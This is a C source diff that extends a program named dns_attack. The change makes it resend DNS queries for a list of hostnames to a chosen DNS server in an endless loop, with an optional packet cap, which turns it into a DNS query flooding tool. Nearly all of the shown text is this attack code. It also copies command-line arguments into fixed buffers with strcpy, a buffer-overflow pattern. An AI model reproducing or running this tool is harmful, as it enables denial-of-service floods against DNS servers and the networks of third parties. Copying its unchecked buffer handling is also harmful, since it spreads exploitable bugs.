@@ -19,7 +19,7 @@
 #define T_MX 15 //Mail server
 
 //prototype 
-void dns_attack (unsigned char*, unsigned char*, unsigned char*, int);
+void dns_attack (unsigned char*, int, unsigned char*, unsigned char*, unsigned int);
 void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
 
 //DNS header structure
@@ -85,9 +85,10 @@ int main( int argc , char *argv[])
     unsigned char dns_server[100];
 	unsigned char hostname[100];
     unsigned char filename[100];
+    unsigned int  num=0;
 
     //Parse options
-    while((opts=getopt(argc, argv, "t:q:f:")) != -1){
+    while((opts=getopt(argc, argv, "t:q:f:n:")) != -1){
        switch(opts){
           case 't':
              strcpy(dns_server, optarg);
@@ -98,6 +99,9 @@ int main( int argc , char *argv[])
           case 'f':
              strcpy(filename, optarg);
              break;
+          case 'n':
+             num = atoi(optarg);
+             break;
           default:
              fprintf(stderr, "Unknow option %c\n", opts);
              exit(0);
@@ -106,11 +110,11 @@ int main( int argc , char *argv[])
     }
 
     //Now get the ip of this hostname , A record
-    dns_attack(dns_server, hostname , filename, T_A);
+    dns_attack(dns_server, T_A, hostname, filename, num);
     return 0;
 }
 
-void dns_attack(unsigned char *dns_server, unsigned char *host , unsigned char *filename, int query_type)
+void dns_attack(unsigned char *dns_server, int query_type, unsigned char *host , unsigned char *filename, unsigned int num) 
 {
 	unsigned char buf[65536],*qname,*reader;
     int sock;
@@ -121,6 +125,8 @@ void dns_attack(unsigned char *dns_server, unsigned char *host , unsigned char *
 	struct QUESTION *qinfo = NULL;
 
     FILE *fp;
+    char *find;
+    int counter=0;
 
 	sock = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries
 
@@ -147,33 +153,45 @@ void dns_attack(unsigned char *dns_server, unsigned char *host , unsigned char *
 	dns->auth_count = 0;
 	dns->add_count = 0;
 
-    //read file list 
-    fp = fopen(filename, "r");
-    if(fp == NULL){
-      perror("cant file open");
-      exit(0);
-    }
-
-
-    while(fgets( host, 100, fp) != NULL){
-       //point to the query portion
-       qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];
-
-       //translate hostname to dns format
-       ChangetoDnsNameFormat(qname , host);
-       qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
-
-       qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
-       qinfo->qclass = htons(1); //its internet (lol)
-
-       printf("SEND QUERY : %s\n", host);
-       if( sendto(sock,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0)
-       {
-          perror("sendto failed");
+    for(;;){
+       //read file list 
+       fp = fopen(filename, "r");
+       if(fp == NULL){
+          perror("cant file open");
+          exit(0);
        }
-    }
 
-    fclose(fp);
+       while(fgets( host, 100, fp) != NULL){
+          if((find = strchr(host,'\n')) != NULL){
+             *find = '\0';
+          }
+          //point to the query portion
+          qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];
+
+          //translate hostname to dns format
+          ChangetoDnsNameFormat(qname , host);
+          qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
+
+          qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
+          qinfo->qclass = htons(1); //its internet (lol)
+
+          printf("SEND QUERY : %s\n", host);
+          if( sendto(sock,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0)
+          {
+             perror("sendto failed");
+          }
+
+          if(num!=0){
+            counter++; 
+            if(counter >= num){
+               fclose(fp);
+               return;
+            }
+          }
+
+       }
+       fclose(fp);
+    }
 }
 
 /*
